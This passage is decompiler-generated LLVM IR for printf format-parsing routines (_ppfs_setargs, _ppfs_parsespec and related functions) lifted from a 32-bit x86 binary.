  %v0_804e88f = phi i32 [ %v0_804e88f.pre, %dec_label_pc_804e889.dec_label_pc_804e88f_crit_edge ], [ %v0_804e85e, %dec_label_pc_804e85e ]
  %v1_804e88f = load i32, i32* @ebx, align 4
  %v2_804e88f = inttoptr i32 %v1_804e88f to i32*
  store i32 %v0_804e88f, i32* %v2_804e88f, align 4
  br label %dec_label_pc_804e893

dec_label_pc_804e893:                             ; preds = %dec_label_pc_804e872, %dec_label_pc_804e88f
  %storemerge = phi i32 [ 0, %dec_label_pc_804e88f ], [ -1, %dec_label_pc_804e872 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804e893 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e893, i32* @edx, align 4
  %v2_804e894 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e894, i32* @ebx, align 4
  store i32 %v0_804e828, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804e889, { 1, 0 }
  uselistorder i8 %v2_804e889, { 1, 2, 0 }
  uselistorder i32 %v0_804e86c.be, { 2, 1, 0 }
  uselistorder i32 %v0_804e86c27, { 1, 0 }
  uselistorder i32 %v0_804e85e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e85b, { 0, 2, 1 }
  uselistorder i32 %v1_804e858, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804e893, { 1, 0 }
  uselistorder label %dec_label_pc_804e867, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e898 = load i32, i32* @esi, align 4
  %v0_804e899 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e8a5 = add i32 %arg1, 24
  %v2_804e8a5 = inttoptr i32 %v1_804e8a5 to i32*
  %v3_804e8a5 = load i32, i32* %v2_804e8a5, align 4
  %v2_804e8a8 = add i32 %arg1, 76
  %v3_804e8a8 = inttoptr i32 %v2_804e8a8 to i32*
  store i32 %arg2, i32* %v3_804e8a8, align 4
  %tmp8 = icmp slt i32 %v3_804e8a5, 1
  br i1 %tmp8, label %dec_label_pc_804e8d6, label %dec_label_pc_804e8af

dec_label_pc_804e8af:                             ; preds = %entry
  %v1_804e8b2 = load i32, i32* @ebx, align 4
  %v2_804e8b2 = add i32 %v1_804e8b2, 28
  %v3_804e8b2 = inttoptr i32 %v2_804e8b2 to i32*
  store i32 %v3_804e8a5, i32* %v3_804e8b2, align 4
  %v0_804e8b5 = load i32, i32* @ebx, align 4
  %v1_804e8b5 = add i32 %v0_804e8b5, 24
  %v2_804e8b5 = inttoptr i32 %v1_804e8b5 to i32*
  store i32 0, i32* %v2_804e8b5, align 4
  %v0_804e8bc = load i32, i32* @ebx, align 4
  %v1_804e8bc = add i32 %v0_804e8bc, 4
  %v2_804e8bc = inttoptr i32 %v1_804e8bc to i32*
  store i32 0, i32* %v2_804e8bc, align 4
  %v0_804e8c3 = load i32, i32* @ebx, align 4
  %v1_804e8c3 = add i32 %v0_804e8c3, 8
  %v2_804e8c3 = inttoptr i32 %v1_804e8c3 to i32*
  store i32 0, i32* %v2_804e8c3, align 4
  %v0_804e8ca = load i32, i32* @ebx, align 4
  %v1_804e8cb = call i32 @_ppfs_setargs(i32 %v0_804e8ca)
  %v1_804e8d0 = load i32, i32* @ebx, align 4
  %v2_804e8d0 = add i32 %v1_804e8d0, 24
  %v3_804e8d0 = inttoptr i32 %v2_804e8d0 to i32*
  store i32 %v3_804e8a5, i32* %v3_804e8d0, align 4
  br label %dec_label_pc_804e8d6

dec_label_pc_804e8d6:                             ; preds = %entry, %dec_label_pc_804e8af
  %v2_804e8d6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e899, i32* @ebx, align 4
  store i32 %v0_804e898, i32* @esi, align 4
  ret i32 %v2_804e8d6

; uselistorder directives
  uselistorder i32 %v3_804e8a5, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e8d6, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e8dd = load i32, i32* @ebx, align 4
  store i32 %v0_804e8dd, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804e8e2 = add i32 %arg1, 80
  store i32 %v1_804e8e2, i32* %ebx.global-to-local, align 4
  %v1_804e8e5 = add i32 %arg1, 24
  %v2_804e8e5 = inttoptr i32 %v1_804e8e5 to i32*
  %v3_804e8e5 = load i32, i32* %v2_804e8e5, align 4
  %v4_804e8e5 = icmp eq i32 %v3_804e8e5, 0
  %v1_804e8e9 = icmp eq i1 %v4_804e8e5, false
  %v1_804e99f = add i32 %arg1, 8
  %v2_804e99f = inttoptr i32 %v1_804e99f to i32*
  %v3_804e99f = load i32, i32* %v2_804e99f, align 4
  %v8_804e99f = icmp eq i32 %v3_804e99f, -2147483648
  %v1_804e9a6 = icmp eq i1 %v8_804e99f, false
  br i1 %v1_804e8e9, label %dec_label_pc_804e99f, label %dec_label_pc_804e8ef

dec_label_pc_804e8ef:                             ; preds = %entry
  br i1 %v1_804e9a6, label %dec_label_pc_804e909, label %dec_label_pc_804e8f8

dec_label_pc_804e8f8:                             ; preds = %dec_label_pc_804e8ef
  %v1_804e8f8 = add i32 %arg1, 76
  %v2_804e8f8 = inttoptr i32 %v1_804e8f8 to i32*
  %v3_804e8f8 = load i32, i32* %v2_804e8f8, align 4
  store i32 %v3_804e8f8, i32* %eax.global-to-local, align 4
  %v1_804e8fb = add i32 %v3_804e8f8, 4
  store i32 %v1_804e8fb, i32* %edx.global-to-local, align 4
  store i32 %v1_804e8fb, i32* %v2_804e8f8, align 4
  %v0_804e901 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e901 = inttoptr i32 %v0_804e901 to i32*
  %v2_804e901 = load i32, i32* %v1_804e901, align 4
  store i32 %v2_804e901, i32* %eax.global-to-local, align 4
  %v1_804e903 = load i32, i32* @ecx, align 4
  %v2_804e903 = add i32 %v1_804e903, 80
  %v3_804e903 = inttoptr i32 %v2_804e903 to i32*
  store i32 %v2_804e901, i32* %v3_804e903, align 4
  %v0_804e906 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e906 = load i32, i32* @ecx, align 4
  %v2_804e906 = add i32 %v1_804e906, 8
  %v3_804e906 = inttoptr i32 %v2_804e906 to i32*
  store i32 %v0_804e906, i32* %v3_804e906, align 4
  %v0_804e909.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e909

dec_label_pc_804e909:                             ; preds = %dec_label_pc_804e8ef, %dec_label_pc_804e8f8
  %v1_804e918 = phi i32 [ %arg1, %dec_label_pc_804e8ef ], [ %v0_804e909.pre, %dec_label_pc_804e8f8 ]
  %v1_804e909 = add i32 %v1_804e918, 4
  %v2_804e909 = inttoptr i32 %v1_804e909 to i32*
  %v3_804e909 = load i32, i32* %v2_804e909, align 4
  %v8_804e909 = icmp eq i32 %v3_804e909, -2147483648
  %v1_804e910 = icmp eq i1 %v8_804e909, false
  br i1 %v1_804e910, label %dec_label_pc_804e923, label %dec_label_pc_804e912

dec_label_pc_804e912:                             ; preds = %dec_label_pc_804e909
  %v1_804e912 = add i32 %v1_804e918, 76
  %v2_804e912 = inttoptr i32 %v1_804e912 to i32*
  %v3_804e912 = load i32, i32* %v2_804e912, align 4
  store i32 %v3_804e912, i32* %eax.global-to-local, align 4
  %v1_804e915 = add i32 %v3_804e912, 4
  store i32 %v1_804e915, i32* %edx.global-to-local, align 4
  store i32 %v1_804e915, i32* %v2_804e912, align 4
  %v0_804e91b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e91b = inttoptr i32 %v0_804e91b to i32*
  %v2_804e91b = load i32, i32* %v1_804e91b, align 4
  store i32 %v2_804e91b, i32* %eax.global-to-local, align 4
  %v1_804e91d = load i32, i32* @ecx, align 4
  %v2_804e91d = add i32 %v1_804e91d, 80
  %v3_804e91d = inttoptr i32 %v2_804e91d to i32*
  store i32 %v2_804e91b, i32* %v3_804e91d, align 4
  %v0_804e920 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e920 = load i32, i32* @ecx, align 4
  %v2_804e920 = add i32 %v1_804e920, 4
  %v3_804e920 = inttoptr i32 %v2_804e920 to i32*
  store i32 %v0_804e920, i32* %v3_804e920, align 4
  %v1_804e99817.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e923

dec_label_pc_804e923:                             ; preds = %dec_label_pc_804e909, %dec_label_pc_804e912
  %v1_804e99817 = phi i32 [ %v1_804e918, %dec_label_pc_804e909 ], [ %v1_804e99817.pre, %dec_label_pc_804e912 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804e99818 = add i32 %v1_804e99817, 28
  %v3_804e99819 = inttoptr i32 %v2_804e99818 to i32*
  %v4_804e99820 = load i32, i32* %v3_804e99819, align 4
  %v5_804e99b21 = icmp sgt i32 %v4_804e99820, 0
  br i1 %v5_804e99b21, label %dec_label_pc_804e927, label %dec_label_pc_804e9cd.loopexit

dec_label_pc_804e927:                             ; preds = %dec_label_pc_804e923, %dec_label_pc_804e997
  %v1_804e99823 = phi i32 [ %v1_804e998, %dec_label_pc_804e997 ], [ %v1_804e99817, %dec_label_pc_804e923 ]
  %v1_804e92722 = phi i32 [ %v1_804e997, %dec_label_pc_804e997 ], [ 0, %dec_label_pc_804e923 ]
  %v2_804e927 = mul i32 %v1_804e92722, 4
  %v3_804e927 = add i32 %v2_804e927, 40
  %v4_804e927 = add i32 %v3_804e927, %v1_804e99823
  %v5_804e927 = inttoptr i32 %v4_804e927 to i32*
  %v6_804e927 = load i32, i32* %v5_804e927, align 4
  store i32 %v6_804e927, i32* %eax.global-to-local, align 4
  %v1_804e92b = add i32 %v6_804e927, -8
  %v9_804e92b = icmp eq i32 %v1_804e92b, 0
  br i1 %v9_804e92b, label %dec_label_pc_804e997, label %dec_label_pc_804e930

dec_label_pc_804e930:                             ; preds = %dec_label_pc_804e927
  %v10_804e92b = icmp slt i32 %v1_804e92b, 0
  %v6_804e92b = sub i32 7, %v6_804e927
  %v7_804e92b = and i32 %v6_804e92b, %v6_804e927
  %v8_804e92b = icmp slt i32 %v7_804e92b, 0
  %v1_804e930 = add i32 %v1_804e99823, 76
  %v2_804e930 = inttoptr i32 %v1_804e930 to i32*
  %v3_804e930 = load i32, i32* %v2_804e930, align 4
  store i32 %v3_804e930, i32* %edx.global-to-local, align 4
  %v3_804e933 = icmp eq i1 %v10_804e92b, %v8_804e92b
  br i1 %v3_804e933, label %dec_label_pc_804e943, label %dec_label_pc_804e935

dec_label_pc_804e935:                             ; preds = %dec_label_pc_804e930
  %tmp15 = icmp slt i32 %v6_804e927, 3
  %v9_804e93c = icmp eq i32 %v6_804e927, 7
  %v1_804e93f = icmp eq i1 %v9_804e93c, false
  %or.cond = or i1 %tmp15, %v1_804e93f
  br i1 %or.cond, label %dec_label_pc_804e98a, label %dec_label_pc_804e96c

dec_label_pc_804e943:                             ; preds = %dec_label_pc_804e930
  %tmp16 = icmp sgt i32 %v6_804e927, 1024
  br i1 %tmp16, label %dec_label_pc_804e94c, label %dec_label_pc_804e98a

dec_label_pc_804e94c:                             ; preds = %dec_label_pc_804e943
  %v6_804e94c = icmp eq i32 %v6_804e927, 2048
  br i1 %v6_804e94c, label %dec_label_pc_804e95c, label %dec_label_pc_804e953

dec_label_pc_804e953:                             ; preds = %dec_label_pc_804e94c
  %v9_804e953 = icmp eq i32 %v6_804e927, 2055
  %v1_804e958 = icmp eq i1 %v9_804e953, false
  br i1 %v1_804e958, label %dec_label_pc_804e98a, label %dec_label_pc_804e97b

dec_label_pc_804e95c:                             ; preds = %dec_label_pc_804e94c
  %v1_804e95c = add i32 %v3_804e930, 8
  store i32 %v1_804e95c, i32* %eax.global-to-local, align 4
  store i32 %v1_804e95c, i32* %v2_804e930, align 4
  %v0_804e962 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e962 = inttoptr i32 %v0_804e962 to i32*
  %v2_804e962 = load i32, i32* %v1_804e962, align 4
  store i32 %v2_804e962, i32* %eax.global-to-local, align 4
  %v1_804e964 = add i32 %v0_804e962, 4
  %v2_804e964 = inttoptr i32 %v1_804e964 to i32*
  %v3_804e964 = load i32, i32* %v2_804e964, align 4
  store i32 %v3_804e964, i32* %edx.global-to-local, align 4
  %v1_804e967 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e967 = add i32 %v1_804e967, 4
  %v3_804e967 = inttoptr i32 %v2_804e967 to i32*
  store i32 %v3_804e964, i32* %v3_804e967, align 4
  %v0_804e992.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e992

dec_label_pc_804e96c:                             ; preds = %dec_label_pc_804e935
  %v3_804e96c = load i32, i32* %v2_804e930, align 4
  store i32 %v3_804e96c, i32* %edx.global-to-local, align 4
  %v1_804e96f = add i32 %v3_804e96c, 8
  store i32 %v1_804e96f, i32* %eax.global-to-local, align 4
  store i32 %v1_804e96f, i32* %v2_804e930, align 4
  %v0_804e975 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e975 = inttoptr i32 %v0_804e975 to double*
  %v2_804e975 = load double, double* %v1_804e975, align 4
  %v2_804e977 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804e977 = inttoptr i32 %v2_804e977 to double*
  store double %v2_804e975, double* %v4_804e977, align 4
  br label %dec_label_pc_804e994

dec_label_pc_804e97b:                             ; preds = %dec_label_pc_804e953
  %v3_804e97b = load i32, i32* %v2_804e930, align 4
  store i32 %v3_804e97b, i32* %edx.global-to-local, align 4
  %v1_804e97e = add i32 %v3_804e97b, 12
  store i32 %v1_804e97e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e97e, i32* %v2_804e930, align 4
  %v0_804e984 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e984 = inttoptr i32 %v0_804e984 to x86_fp80*
  %v2_804e984 = load x86_fp80, x86_fp80* %v1_804e984, align 4
  %v2_804e986 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804e986 = inttoptr i32 %v2_804e986 to x86_fp80*
  store x86_fp80 %v2_804e984, x86_fp80* %v3_804e986, align 4
  br label %dec_label_pc_804e994

dec_label_pc_804e98a:                             ; preds = %dec_label_pc_804e935, %dec_label_pc_804e943, %dec_label_pc_804e953
  %v1_804e98a = add i32 %v3_804e930, 4
  store i32 %v1_804e98a, i32* %eax.global-to-local, align 4
  store i32 %v1_804e98a, i32* %v2_804e930, align 4
  %v0_804e990 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e990 = inttoptr i32 %v0_804e990 to i32*
  %v2_804e990 = load i32, i32* %v1_804e990, align 4
  store i32 %v2_804e990, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e992

dec_label_pc_804e992:                             ; preds = %dec_label_pc_804e95c, %dec_label_pc_804e98a
  %v0_804e992 = phi i32 [ %v0_804e992.pre, %dec_label_pc_804e95c ], [ %v2_804e990, %dec_label_pc_804e98a ]
  %v1_804e992 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e992 = inttoptr i32 %v1_804e992 to i32*
  store i32 %v0_804e992, i32* %v2_804e992, align 4
  %v0_804e994.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e994

dec_label_pc_804e994:                             ; preds = %dec_label_pc_804e97b, %dec_label_pc_804e96c, %dec_label_pc_804e992
  %v0_804e994 = phi i32 [ %v2_804e986, %dec_label_pc_804e97b ], [ %v2_804e977, %dec_label_pc_804e96c ], [ %v0_804e994.pre, %dec_label_pc_804e992 ]
  %v1_804e994 = add i32 %v0_804e994, 12
  store i32 %v1_804e994, i32* %ebx.global-to-local, align 4
  %v0_804e997.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804e998.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e997

dec_label_pc_804e997:                             ; preds = %dec_label_pc_804e927, %dec_label_pc_804e994
  %v1_804e998 = phi i32 [ %v1_804e99823, %dec_label_pc_804e927 ], [ %v1_804e998.pre, %dec_label_pc_804e994 ]
  %v0_804e997 = phi i32 [ %v1_804e92722, %dec_label_pc_804e927 ], [ %v0_804e997.pre, %dec_label_pc_804e994 ]
  %v1_804e997 = add i32 %v0_804e997, 1
  store i32 %v1_804e997, i32* %esi.global-to-local, align 4
  %v2_804e998 = add i32 %v1_804e998, 28
  %v3_804e998 = inttoptr i32 %v2_804e998 to i32*
  %v4_804e998 = load i32, i32* %v3_804e998, align 4
  %v5_804e99b = icmp slt i32 %v1_804e997, %v4_804e998
  br i1 %v5_804e99b, label %dec_label_pc_804e927, label %dec_label_pc_804e9cd.loopexit

dec_label_pc_804e99f:                             ; preds = %entry
  br i1 %v1_804e9a6, label %dec_label_pc_804e9b6, label %dec_label_pc_804e9a8

dec_label_pc_804e9a8:                             ; preds = %dec_label_pc_804e99f
  %v1_804e9a8 = add i32 %arg1, 36
  %v2_804e9a8 = inttoptr i32 %v1_804e9a8 to i8*
  %v3_804e9a8 = load i8, i8* %v2_804e9a8, align 1
  %v2_804e9ac = zext i8 %v3_804e9a8 to i32
  %v3_804e9ac = mul nuw nsw i32 %v2_804e9ac, 12
  store i32 %v3_804e9ac, i32* %eax.global-to-local, align 4
  %v2_804e9af = add i32 %arg1, 68
  %v3_804e9af = add i32 %v2_804e9af, %v3_804e9ac
  %v4_804e9af = inttoptr i32 %v3_804e9af to i32*
  %v5_804e9af = load i32, i32* %v4_804e9af, align 4
  store i32 %v5_804e9af, i32* %eax.global-to-local, align 4
  store i32 %v5_804e9af, i32* %v2_804e99f, align 4
  %v0_804e9b6.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e9b6

dec_label_pc_804e9b6:                             ; preds = %dec_label_pc_804e99f, %dec_label_pc_804e9a8
  %v1_804e9ca = phi i32 [ %arg1, %dec_label_pc_804e99f ], [ %v0_804e9b6.pre, %dec_label_pc_804e9a8 ]
  %v1_804e9b6 = add i32 %v1_804e9ca, 4
  %v2_804e9b6 = inttoptr i32 %v1_804e9b6 to i32*
  %v3_804e9b6 = load i32, i32* %v2_804e9b6, align 4
  %v8_804e9b6 = icmp eq i32 %v3_804e9b6, -2147483648
  %v1_804e9bd = icmp eq i1 %v8_804e9b6, false
  br i1 %v1_804e9bd, label %dec_label_pc_804e9cd, label %dec_label_pc_804e9bf

dec_label_pc_804e9bf:                             ; preds = %dec_label_pc_804e9b6
  %v1_804e9bf = add i32 %v1_804e9ca, 37
  %v2_804e9bf = inttoptr i32 %v1_804e9bf to i8*
  %v3_804e9bf = load i8, i8* %v2_804e9bf, align 1
  %v2_804e9c3 = zext i8 %v3_804e9bf to i32
  %v3_804e9c3 = mul nuw nsw i32 %v2_804e9c3, 12
  store i32 %v3_804e9c3, i32* %eax.global-to-local, align 4
  %v1_804e9c6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e9c6 = add nsw i32 %v3_804e9c3, -12
  %v3_804e9c6 = add i32 %v2_804e9c6, %v1_804e9c6
  %v4_804e9c6 = inttoptr i32 %v3_804e9c6 to i32*
  %v5_804e9c6 = load i32, i32* %v4_804e9c6, align 4
  store i32 %v5_804e9c6, i32* %eax.global-to-local, align 4
  store i32 %v5_804e9c6, i32* %v2_804e9b6, align 4
  %v0_804e9cd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e9cd

dec_label_pc_804e9cd.loopexit:                    ; preds = %dec_label_pc_804e997, %dec_label_pc_804e923
  %v1_804e998.lcssa = phi i32 [ %v1_804e99817, %dec_label_pc_804e923 ], [ %v1_804e998, %dec_label_pc_804e997 ]
  br label %dec_label_pc_804e9cd

dec_label_pc_804e9cd:                             ; preds = %dec_label_pc_804e9cd.loopexit, %dec_label_pc_804e9b6, %dec_label_pc_804e9bf
  %v10_804e9d4 = phi i32 [ %v1_804e998.lcssa, %dec_label_pc_804e9cd.loopexit ], [ %v1_804e9ca, %dec_label_pc_804e9b6 ], [ %v0_804e9cd.pre, %dec_label_pc_804e9bf ]
  %v1_804e9cd = add i32 %v10_804e9d4, 8
  %v2_804e9cd = inttoptr i32 %v1_804e9cd to i32*
  %v3_804e9cd = load i32, i32* %v2_804e9cd, align 4
  store i32 %v3_804e9cd, i32* %eax.global-to-local, align 4
  %v2_804e9d0 = icmp slt i32 %v3_804e9cd, 0
  %v1_804e9d2 = icmp eq i1 %v2_804e9d0, false
  br i1 %v1_804e9d2, label %dec_label_pc_804e9e8, label %dec_label_pc_804e9d4

dec_label_pc_804e9d4:                             ; preds = %dec_label_pc_804e9cd
  %v1_804e9d4 = add i32 %v10_804e9d4, 16
  %v2_804e9d4 = inttoptr i32 %v1_804e9d4 to i32*
  %v3_804e9d4 = load i32, i32* %v2_804e9d4, align 4
  %v4_804e9d4 = or i32 %v3_804e9d4, 8
  store i32 %v4_804e9d4, i32* %v2_804e9d4, align 4
  %v0_804e9d8 = load i32, i32* @ecx, align 4
  %v1_804e9d8 = add i32 %v0_804e9d8, 16
  %v2_804e9d8 = inttoptr i32 %v1_804e9d8 to i32*
  %v3_804e9d8 = load i32, i32* %v2_804e9d8, align 4
  %v4_804e9d8 = and i32 %v3_804e9d8, -2
  store i32 %v4_804e9d8, i32* %v2_804e9d8, align 4
  %v0_804e9dc = load i32, i32* %eax.global-to-local, align 4
  %v1_804e9dc = sub i32 0, %v0_804e9dc
  store i32 %v1_804e9dc, i32* %eax.global-to-local, align 4
  %v1_804e9de = load i32, i32* @ecx, align 4
  %v2_804e9de = add i32 %v1_804e9de, 8
  %v3_804e9de = inttoptr i32 %v2_804e9de to i32*
  store i32 %v1_804e9dc, i32* %v3_804e9de, align 4
  %v0_804e9e1 = load i32, i32* @ecx, align 4
  %v1_804e9e1 = add i32 %v0_804e9e1, 20
  %v2_804e9e1 = inttoptr i32 %v1_804e9e1 to i32*
  store i32 32, i32* %v2_804e9e1, align 4
  %v0_804e9ea.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e9e8

dec_label_pc_804e9e8:                             ; preds = %dec_label_pc_804e9cd, %dec_label_pc_804e9d4
  %v0_804e9ea = phi i32 [ %v3_804e9cd, %dec_label_pc_804e9cd ], [ %v0_804e9ea.pre, %dec_label_pc_804e9d4 ]
  %v2_804e9e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e9e8, i32* @ebx, align 4
  ret i32 %v0_804e9ea

; uselistorder directives
  uselistorder i32 %v3_804e9c3, { 1, 0 }
  uselistorder i32 %v3_804e9ac, { 1, 0 }
  uselistorder i32 %v1_804e997, { 2, 1, 0 }
  uselistorder i32 %v1_804e998, { 0, 2, 1 }
  uselistorder i32 %v3_804e930, { 1, 0, 2 }
  uselistorder i32* %v2_804e930, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804e92b, { 1, 0 }
  uselistorder i32 %v6_804e927, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804e92722, { 1, 0 }
  uselistorder i1 %v1_804e9a6, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804e9e8, { 1, 0 }
  uselistorder label %dec_label_pc_804e9cd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e9b6, { 1, 0 }
  uselistorder label %dec_label_pc_804e997, { 1, 0 }
  uselistorder label %dec_label_pc_804e994, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e992, { 1, 0 }
  uselistorder label %dec_label_pc_804e98a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e927, { 1, 0 }
  uselistorder label %dec_label_pc_804e923, { 1, 0 }
  uselistorder label %dec_label_pc_804e909, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e9ec = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e9f3

dec_label_pc_804e9f3:                             ; preds = %dec_label_pc_804e9f3, %entry
  %v0_804e9f3 = phi i32 [ ptrtoint (i8** @global_var_8056e8a.205 to i32), %entry ], [ %v1_804e9f3, %dec_label_pc_804e9f3 ]
  %v1_804e9f3 = add i32 %v0_804e9f3, -2
  %v1_804e9f6 = inttoptr i32 %v1_804e9f3 to i16*
  %v2_804e9f6 = load i16, i16* %v1_804e9f6, align 2
  %v3_804e9f6 = sext i16 %v2_804e9f6 to i32
  %v12_804e9f9 = icmp ne i32 %v3_804e9f6, %v0_804e9ec
  %v6_804ea03 = icmp ugt i32 %v1_804e9f3, ptrtoint (i32* @global_var_8056e72.206 to i32)
  %or.cond = and i1 %v6_804ea03, %v12_804e9f9
  br i1 %or.cond, label %dec_label_pc_804e9f3, label %dec_label_pc_804ea05

dec_label_pc_804ea05:                             ; preds = %dec_label_pc_804e9f3
  %.pre = add i32 %v0_804e9f3, -134573684
  %v2_804ea0b = sdiv i32 %.pre, 2
  store i32 %v2_804ea0b, i32* @edx, align 4
  %v1_804ea0d = add i32 %v2_804ea0b, ptrtoint (i8** @global_var_8056e8a.205 to i32)
  %v2_804ea0d = inttoptr i32 %v1_804ea0d to i8*
  %v3_804ea0d = load i8, i8* %v2_804ea0d, align 1
  %v4_804ea0d = zext i8 %v3_804ea0d to i32
  ret i32 %v4_804ea0d

; uselistorder directives
  uselistorder i32 %v2_804ea0b, { 1, 0 }
  uselistorder i32 %v1_804e9f3, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8056e8a.205 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ea16 = load i32, i32* @edi, align 4
  %v0_804ea17 = load i32, i32* @esi, align 4
  %v0_804ea18 = load i32, i32* @ebx, align 4
  store i32 %v0_804ea18, i32* %stack_var_-16, align 4
  %v4_804ea18 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ea44 = add i32 %tmp76, 24
  %v2_804ea44 = inttoptr i32 %v1_804ea44 to i32*
  %v3_804ea44 = load i32, i32* %v2_804ea44, align 4
  store i32 %v3_804ea44, i32* %eax.global-to-local, align 4
  %v1_804ea4b = add i32 %tmp76, 16
  %v2_804ea4b = inttoptr i32 %v1_804ea4b to i32*
  %v3_804ea4b = load i32, i32* %v2_804ea4b, align 4
  %v1_804ea4e = and i32 %v3_804ea4b, 128
  %v2_804ea4e = icmp eq i32 %v1_804ea4e, 0
  store i32 %v1_804ea4e, i32* %edi.global-to-local, align 4
  %v1_804ea54 = icmp eq i1 %v2_804ea4e, false
  br i1 %v1_804ea54, label %dec_label_pc_804ea67, label %dec_label_pc_804ea56

dec_label_pc_804ea56:                             ; preds = %entry
  %v2_804ea56 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804eab4.outer

dec_label_pc_804ea61:                             ; preds = %dec_label_pc_804ebef
  %v1_804ea61 = add i32 %v0_804ebef.pre.pre, 1
  store i32 %v1_804ea61, i32* @esi, align 4
  br label %dec_label_pc_804ebff

dec_label_pc_804ea67:                             ; preds = %entry
  %v15_804ea19 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ea69

dec_label_pc_804ea69:                             ; preds = %dec_label_pc_804ea91.dec_label_pc_804ea69_crit_edge, %dec_label_pc_804ea67
  %v2_804ea7a = phi i32 [ %v2_804ea7a.pre, %dec_label_pc_804ea91.dec_label_pc_804ea69_crit_edge ], [ %v15_804ea19, %dec_label_pc_804ea67 ]
  %v3_804ea7a = phi i32 [ %v1_804ea91, %dec_label_pc_804ea91.dec_label_pc_804ea69_crit_edge ], [ 0, %dec_label_pc_804ea67 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ea6d = mul i32 %v3_804ea7a, 4
  store i32 %v1_804ea6d, i32* @ecx, align 4
  %v2_804ea74 = load i32, i32* %arg1, align 4
  store i32 %v2_804ea74, i32* @edx, align 4
  %v2_804ea76 = add i32 %v1_804ea6d, -4
  %v3_804ea76 = add i32 %v2_804ea76, %v2_804ea74
  %v4_804ea76 = inttoptr i32 %v3_804ea76 to i32*
  %v5_804ea76 = load i32, i32* %v4_804ea76, align 4
  store i32 %v5_804ea76, i32* %eax.global-to-local, align 4
  %v1_804ea7a = trunc i32 %v5_804ea76 to i8
  %v4_804ea7a = add i32 %v2_804ea7a, 36
